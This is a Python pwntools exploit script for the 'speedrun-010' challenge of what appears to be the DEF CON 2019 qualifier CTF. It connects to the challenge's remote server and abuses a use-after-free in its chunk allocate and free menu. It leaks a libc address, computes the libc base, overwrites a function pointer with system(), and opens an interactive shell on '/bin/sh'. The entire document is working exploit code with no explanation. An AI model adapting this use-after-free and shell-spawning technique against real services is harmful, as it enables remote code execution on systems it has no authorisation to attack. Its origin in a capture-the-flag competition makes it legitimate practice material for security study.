from pwn import *

# p = process('./speedrun-010')
p = remote('speedrun-010.quals2019.oooverflow.io', 31337)
e = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
# context.log_level = 'debug'


def chunk1(value):
    p.recvuntil('5')
    p.send('1')
    p.recvuntil('name')
    p.send(value)


def chunk2(value):
    p.recvuntil('5')
    p.send('2')
    p.recvuntil('message')
    p.send(value)


def free1():
    p.recvuntil('5')
    p.send('3')


def free2():
    p.recvuntil('5')
    p.send('4')


chunk1('/bin/sh\x00' * 2)
free1()
chunk2('B' * 0xf + 'C')

p.recvuntil('C')
libc_base = p.recvline()[:-1]
libc_base = u64(libc_base + chr(0) * (8 - len(libc_base))) - 0x809c0
print(hex(libc_base))

free2()

chunk1('/bin/sh\x00' * 2)
free1()
chunk2('B' * 0x10 + p64(libc_base + e.symbols['system']))


# chunk2('/bin/sh\x00' + 'B' * 8 + p64(libc_base + e.symbols['system']))

p.interactive()
